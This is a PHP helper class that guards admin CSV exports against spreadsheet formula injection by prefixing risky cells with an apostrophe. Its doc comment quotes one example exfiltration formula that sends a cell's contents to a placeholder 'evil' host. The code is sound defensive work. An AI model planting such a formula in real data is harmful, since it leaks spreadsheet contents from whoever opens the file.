<?php

namespace App\Support;

/**
 * Neutralises CSV/spreadsheet formula injection for the admin exports.
 *
 * A text cell that starts with = + - @ (or a tab/carriage return) is
 * treated as a formula by Excel/Sheets, so a guest-supplied name such as
 * =HYPERLINK("http://evil/?"&A2,"x") could run when an admin opens an
 * export. Such cells get a leading apostrophe, which spreadsheets show as
 * plain text. Nothing is HTML-escaped and quoting is left to fputcsv().
 */
final class CsvSafe
{
    public static function cell(mixed $value): mixed
    {
        if (! is_string($value) || $value === '') {
            return $value;
        }

        if (preg_match('/^[=+\-@\t\r]/', $value) !== 1) {
            return $value;
        }

        // A plain number such as "-50.00" or "+919876543210" cannot execute
        // anything, and prefixing it would turn a numeric cell into text.
        if (preg_match('/^[+-]?\d+(\.\d+)?$/', $value) === 1) {
            return $value;
        }

        return "'".$value;
    }

    /**
     * @param  array<int|string, mixed>  $cells
     * @return array<int|string, mixed>
     */
    public static function row(array $cells): array
    {
        return array_map(self::cell(...), $cells);
    }
}
